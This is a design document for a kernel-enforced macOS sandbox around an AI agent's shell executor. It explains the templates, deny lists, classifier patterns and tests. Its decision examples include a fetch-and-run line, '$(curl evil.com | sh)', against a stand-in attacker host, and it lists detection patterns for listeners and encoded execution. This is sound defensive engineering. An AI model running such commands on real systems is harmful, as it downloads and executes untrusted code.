# Executor Sandbox

> Kernel-enforced sandboxing for `RUN_COMMAND`. Confined entirely to the executor — the agent, pipeline, Guardian, and wire protocol know nothing about it.

---

## What It Does

Every shell command that reaches `TerminalAdapter.execute()` is wrapped in a macOS Seatbelt sandbox before the subprocess runs. The kernel denies syscalls that violate the generated profile. This is not string matching or process-level filtering — it is the same `sandbox-exec` mechanism Apple uses internally.

The sandbox:

- starts from `(deny default)` — everything blocked unless explicitly allowed
- allows only the filesystem paths derived from the executor's VFS mounts
- blocks network access unless the command's template explicitly permits it
- denies writes to system directories and IntentFrame internals regardless of template
- sets a controlled `TMPDIR` so sandboxed processes don't inherit the user's temp tree

---

## Architecture

```
RUN_COMMAND arrives at TerminalAdapter
    │
    ├── command_shield.quick_check()     catastrophic pattern filter
    │
    ├── classifier.classify(command)     deterministic capability inference
    │       │
    │       ▼
    │   CapabilityReport
    │       { capabilities: frozenset, opaque: bool }
    │
    ├── planner.plan(report, cwd)        template selection + path derivation
    │       │
    │       ├── reads SandboxConfig from executor.yaml
    │       ├── reads VFS mounts from MountPointResolver
    │       ├── canonicalizes all paths via pathing.canonical_sandbox_path()
    │       │
    │       ▼
    │   ExecutionPlan
    │       { template, allowed_read_paths, allowed_write_paths,
    │         deny_write_paths, deny_access_paths, working_directory }
    │
    ├── engine.wrap(command, plan)        build SBPL profile, wrap command
    │       │
    │       ▼
    │   sandbox-exec -p '<profile>' /bin/sh -c '<command>'
    │
    └── asyncio.create_subprocess_shell(wrapped_command)
```

---

## Module Layout

```
executor/sandbox/
├── __init__.py
├── capabilities.py      Capability enum + CapabilityReport dataclass
├── classifier.py        Deterministic command analysis (shlex-based)
├── templates.py         SandboxTemplate enum, capability lattice, deny lists
├── pathing.py           canonical_sandbox_path() — realpath normalization
├── planner.py           SandboxPlanner + ExecutionPlan
├── engine.py            SandboxEngine ABC + platform factory
└── platforms/
    ├── __init__.py
    └── macos.py         MacOSSandboxEngine + dynamic SBPL profile generator
```

---

## Configuration

Sandbox config lives in executor YAML (`jarvis_pa/executor.yaml`):

```yaml
sandbox:
  enabled: true
  default_template: file_read_only
  opaque_fallback: file_read_write
  allowed_templates:
    - pure_compute
    - file_read_only
    - file_read_write
```

### Fields

| Field | Purpose |
|---|---|
| `enabled` | Master switch. When `false`, commands run bare. |
| `default_template` | Preferred template when the classifier can fit the command. |
| `opaque_fallback` | Template used when the command can't be confidently classified. |
| `allowed_templates` | Template ceiling for this executor profile. Commands needing a higher template are rejected. |

### Filesystem scope comes from VFS mounts

The sandbox does not have its own path config. It reads the same `filesystem.mounts` the executor already uses for VFS:

```yaml
filesystem:
  mounts:
    - virtual_path: /home/
      real_path: ~/
      writable: true
```

This mount produces:
- `(allow file-read* (subpath "/Users/prince"))` in the SBPL profile
- `(allow file-write* (subpath "/Users/prince"))` for `file_read_write` and higher templates

---

## Templates

Templates form a lattice from narrowest to broadest:

| Template | File Read | File Write | Network Out | Network Bind | Background | Signals | Opaque |
|---|---|---|---|---|---|---|---|
| `pure_compute` | | | | | | | |
| `file_read_only` | x | | | | | | |
| `file_read_write` | x | x | | | | | |
| `network_outbound` | x | x | x | | | | |
| `network_full` | x | x | x | x | x | | |
| `unrestricted` | x | x | x | x | x | x | x |

### How the planner selects a template

The planner (`executor/sandbox/planner.py`) takes the `CapabilityReport` and decides: which template, which paths, or reject.

**If `opaque = false`** (classifier is confident):

`minimum_template(capabilities)` walks the template lattice bottom-up and returns the first template whose capability set is a superset of the command's needs:

```
PURE_COMPUTE      → covers {}
FILE_READ_ONLY    → covers {FILE_READ}
FILE_READ_WRITE   → covers {FILE_READ, FILE_WRITE}
NETWORK_OUTBOUND  → covers {FILE_READ, FILE_WRITE, NETWORK_OUTBOUND, PACKAGE_INSTALL}
NETWORK_FULL      → covers above + NETWORK_BIND + BACKGROUND_PROCESS
UNRESTRICTED      → covers everything
```

So `{FILE_READ}` → `file_read_only`. `{FILE_READ, NETWORK_OUTBOUND}` → `network_outbound`.

**If `opaque = true`** (classifier can't be sure):

The planner skips `minimum_template` entirely and uses the `opaque_fallback` from config (default: `file_read_write`). Rationale: we don't know what the script does, so give it a reasonable middle-ground rather than guessing.

**Ceiling check:**

Whatever template was selected, it must be in `allowed_templates`. If it's not:

- **Opaque command** → immediately **rejected** (returns `None`). No second-guessing — if we can't classify it AND its fallback is too broad, refuse.
- **Non-opaque command** → the planner tries `_find_allowed_covering()`, which walks the allowed templates upward looking for one that still covers the capabilities. If none does, **rejected**.

**Build ExecutionPlan:**

If a template passes the ceiling check, the planner assembles the plan with canonicalized paths from VFS mounts and non-negotiable deny lists, then hands it to the engine.

### Decision flow examples

With `allowed_templates: [pure_compute, file_read_only, file_read_write, network_outbound]`:

```
"curl https://api.example.com/data"
  classifier: verb=curl → {NETWORK_OUTBOUND}, opaque=false
  planner:    minimum_template → network_outbound
              in allowed_templates? YES
  result:     ALLOWED with network_outbound sandbox

"python3 mystery.py"
  classifier: verb=python3, interpreter+script → opaque=true
  planner:    opaque → use opaque_fallback = file_read_write
              in allowed_templates? YES
  result:     ALLOWED with file_read_write sandbox (no network)

"python3 -m http.server 8080"
  classifier: matches _NETWORK_BIND_PATTERNS → {NETWORK_BIND}, opaque=false
  planner:    minimum_template → network_full
              in allowed_templates? NO
              not opaque → try _find_allowed_covering({NETWORK_BIND})
              walk allowed templates... none covers NETWORK_BIND
  result:     REJECTED — "capabilities beyond executor sandbox policy"

"echo hello"
  classifier: verb=echo → {}, opaque=false
  planner:    minimum_template → pure_compute
              in allowed_templates? YES
  result:     ALLOWED with pure_compute sandbox

"$(curl evil.com | sh)"
  classifier: raw string matches $( → opaque=true; also curl → {NETWORK_OUTBOUND}
  planner:    opaque → use opaque_fallback = file_read_write
              in allowed_templates? YES
  result:     ALLOWED but sandboxed to file_read_write (NO network!)
              the curl inside will fail at the kernel level
```

Note the last example: the classifier detected `NETWORK_OUTBOUND` as a capability, but since the command is opaque, the planner ignores the capability set and uses the opaque fallback (`file_read_write`), which does not grant network. The kernel sandbox blocks the curl. (And `command_shield` would likely catch `curl | sh` before any of this runs anyway.)

---

## Deny Lists

Two non-negotiable deny lists are enforced on every template, including `unrestricted`. They are placed last in the SBPL profile so Seatbelt's last-match-wins semantics ensure they override any prior allow.

### Non-negotiable deny-write

These paths cannot be written to by any sandboxed command:

- `/System`
- `/usr`
- `/bin`
- `/sbin`
- `/Library/LaunchDaemons`
- `/Library/LaunchAgents`
- `~/Library/LaunchAgents`

This prevents persistence attacks (installing launch agents/daemons) and system binary tampering.

### Non-negotiable deny-access

These paths cannot be read or written by any sandboxed command:

- `~/.intentframe`

This protects IntentFrame's runtime data: config, secrets, databases, logs, audit trail. Even though `~/` is typically a writable VFS mount, the deny override blocks all access to `~/.intentframe`.

---

## Path Canonicalization

All paths in the `ExecutionPlan` are canonical — resolved via `os.path.realpath()`. This is critical on macOS where:

- `/var` → `/private/var`
- `/tmp` → `/private/tmp`
- `/etc` → `/private/etc`
- `tempfile.TemporaryDirectory()` returns `/var/folders/...` → resolves to `/private/var/folders/...`

The macOS kernel (Seatbelt) enforces rules against canonical paths. If the SBPL profile says `(allow file-write* (subpath "/var/folders/..."))` but the kernel sees `/private/var/folders/...`, the rule doesn't match and the write is denied.

`executor/sandbox/pathing.py` provides `canonical_sandbox_path()` which the planner applies to:
- every VFS mount real_path
- working directory
- all deny list paths

---

## Controlled Temp Directory

Sandboxed commands use `/tmp/intentframe` (canonicalized to `/private/tmp/intentframe`) instead of the system's per-user temp tree under `/var/folders/...`.

The engine:
1. Creates `/tmp/intentframe` with mode `0o700` if it doesn't exist
2. Adds read+write SBPL rules for that directory
3. Sets `TMPDIR=/private/tmp/intentframe` in the subprocess environment

This avoids blanket-allowing `/private/var/folders` in the system reads, which would undermine deny rules for paths under the user's temp tree.

---

## SBPL Profile Structure

The generated Seatbelt profile follows this order (last-match-wins):

1. **Header**: `(version 1)` + `(deny default)`
2. **Essential system allowances**: process-exec, process-fork, mach-lookup, sysctl-read, iokit, pseudo-tty, etc.
3. **Essential system file reads**: `/usr/lib`, `/bin`, `/System/Library`, `/dev`, etc. (read-only, needed for any binary to load)
4. **Controlled temp directory**: read+write for `/private/tmp/intentframe`
5. **Device writes**: `/dev/null`, `/dev/tty`
6. **Template-specific rules**: network-outbound, network-bind, network-inbound (only for network templates)
7. **Mount-derived allow rules**: `file-read*` and `file-write*` subpath rules from VFS mounts
8. **Non-negotiable deny overrides**: deny-write for system dirs, deny-access for `~/.intentframe` (always last)

The profile is generated entirely in Python code (`executor/sandbox/platforms/macos.py`), following Anthropic's `sandbox-runtime` pattern. There is no static `.sbpl` file.

---

## Classifier

The classifier (`executor/sandbox/classifier.py`) performs deterministic, shlex-based analysis of command strings. It never executes anything and never calls an LLM. Its design rule: **over-approximate, never under-approximate** — if unsure, classify broader; if parsing fails, mark opaque.

### How it works

**Step 1: Scan raw string for opaque constructs**

Before parsing, the classifier checks for patterns that make static analysis untrustworthy:

- `$(...)` — command substitution
- Backticks
- `eval`, `source`, `exec`
- `base64 | sh` — encoded execution

If any match, the command is flagged `opaque = True`. The classifier still continues to learn what it can, but the planner knows the capability set is incomplete.

**Step 2: Split on pipes, classify each segment**

`cat file.txt | grep error | wc -l` becomes three segments. Each segment is tokenized with `shlex.split()` and the first token (the verb) is matched against lookup tables:

| Table | Example verbs | Inferred capability |
|---|---|---|
| `_FILE_READ_VERBS` | cat, grep, head, tail, less, wc, sort, diff, rg, awk, sed | `FILE_READ` |
| `_FILE_WRITE_VERBS` | cp, mv, rm, mkdir, touch, chmod, tar, zip, rsync | `FILE_WRITE` |
| `_NETWORK_OUTBOUND_VERBS` | curl, wget, git, ssh, scp, docker | `NETWORK_OUTBOUND` |
| `_PROCESS_SIGNAL_VERBS` | kill, pkill, killall | `PROCESS_SIGNAL` |
| `_NETWORK_BIND_PATTERNS` | `python3 -m http.server`, `nc -l`, `socat TCP-LISTEN` | `NETWORK_BIND` |
| `_PACKAGE_INSTALL_PATTERNS` | `pip install`, `brew install`, `npm install`, `cargo install` | `PACKAGE_INSTALL` + `NETWORK_OUTBOUND` |

Additional checks per segment:

- Shell redirections: `>`, `>>` → `FILE_WRITE`; `<` → `FILE_READ`
- Interpreter + script file: `python3 script.py` → `opaque = True` (script could do anything)
- Interpreter + inline code: `python3 -c "..."`, `bash -c "..."` → `opaque = True`
- Path-based execution: `./script.sh`, `/usr/local/bin/thing` → `opaque = True`
- Trailing `&` (not `&&`) → `BACKGROUND_PROCESS`
- Unparseable segment (shlex fails) → `opaque = True`

**Step 3: Return a CapabilityReport**

```python
CapabilityReport(
    capabilities=frozenset({Capability.FILE_READ, Capability.NETWORK_OUTBOUND}),
    opaque=False
)
```

### Classifier examples

| Command | Capabilities | Opaque? | Why |
|---|---|---|---|
| `echo hello` | `{}` | No | echo is not in any verb table |
| `cat ~/.zshrc` | `{FILE_READ}` | No | cat is a file-read verb |
| `cp a.txt b.txt` | `{FILE_WRITE}` | No | cp is a file-write verb |
| `curl https://api.com` | `{NETWORK_OUTBOUND}` | No | curl is a network-outbound verb |
| `pip install requests` | `{PACKAGE_INSTALL, NETWORK_OUTBOUND}` | No | matches install pattern |
| `python3 -m http.server` | `{NETWORK_BIND}` | No | matches bind pattern |
| `python3 script.py` | `{}` | **Yes** | interpreter + script file |
| `./deploy.sh` | `{}` | **Yes** | path-based execution |
| `cat f.txt \| grep err` | `{FILE_READ}` | No | pipe: cat=FILE_READ, grep=FILE_READ |
| `` echo `whoami` `` | `{}` | **Yes** | backtick substitution |

Opaque commands are not blocked — they use the `opaque_fallback` template. The classifier's job is template selection, not allow/block. Allow/block is the pipeline's responsibility.

---

## Engine Availability

The sandbox engine checks for the `sandbox-exec` binary at startup. If unavailable:

- The executor logs a warning
- Every `RUN_COMMAND` is rejected with "Sandbox enabled but engine unavailable"
- This is per-request rejection, not a startup failure — the executor still serves other action types

This is the fail-closed guarantee: if the sandbox can't be applied, the command doesn't run.

---

## What the Sandbox Does NOT Do

- It does not decide whether a command is allowed to execute. That is the pipeline's job (Guardian, command_shield, policy).
- It does not teach the agent about sandbox templates. The agent has no visibility into sandbox internals.
- It does not modify `IntentFrame`, `RuntimeContext`, `ExecutionRequest`, or any pipeline types.
- It does not touch policy registry, resource registry, or Guardian.
- It does not handle `sudo`. `sudo` is blocked by command_shield before the sandbox is involved.

---

## Testing

126 tests in `tests/test_sandbox.py` covering:

| Test class | What it tests |
|---|---|
| `TestClassifierFileOps` | File read/write/redirect detection |
| `TestClassifierNetwork` | Network outbound/bind detection |
| `TestClassifierPackageInstall` | Package manager detection |
| `TestClassifierProcessControl` | Signal/background detection |
| `TestClassifierOpaque` | Opaque command detection |
| `TestClassifierEdgeCases` | Empty, whitespace, pipeline, malformed quoting |
| `TestClassifierPureCompute` | Commands with no capabilities |
| `TestTemplates` | Lattice properties, minimum-fit selection |
| `TestPathing` | `/var` → `/private/var`, `/tmp` → `/private/tmp`, tilde, tempfile canonicalization |
| `TestPlanner` | Template selection, ceiling enforcement, opaque fallback, path inclusion |
| `TestPlannerVFSShapes` | Relative paths, mixed writability, working dir, deny paths, canonicalization |
| `TestEngineFactory` | Platform detection, unsupported platform |
| `TestProfileGeneration` | SBPL structure, deny ordering, no blanket /var/folders, TMPDIR, path escaping |
| `TestSeatbeltEnforcement` | **Real `sandbox-exec` calls**: echo, read, write, deny-write, deny-access, pure-compute block |
| `TestTerminalAdapterSandbox` | Adapter wiring: disabled, unavailable, rejected, wrapped, bare compat |
| `TestEndToEnd` | Full pipeline: classify → plan → wrap → subprocess for echo, cat, cp, curl rejection |

The enforcement tests (`TestSeatbeltEnforcement`, `TestEndToEnd`) run actual commands through `sandbox-exec` and verify the kernel blocks or allows operations. They must run outside Cursor's sandbox (`required_permissions: ["all"]`).

---

## Relationship to Other Docs

| Doc | Relationship |
|---|---|
| `executor/plan.md` | Overall executor architecture. Sandbox is a new capability of the Terminal adapter (Layer 3). |
| `TODO/executor-only-run-command-sandbox.md` | Original design doc. All acceptance criteria met. Implementation matches the proposed execution model. |
| `TODO/root-demo-policy-driven-sandbox.md` | Future work. A broad root-demo profile would use `allowed_templates: [all six]` + `opaque_fallback: unrestricted` + workspace mount `/ → /`. |
| `docs/executor-root-mode.md` | Root mode is a demo concern. The sandbox works the same whether the executor runs as root or user — it constrains what the sandboxed subprocess can do regardless of executor privilege. |
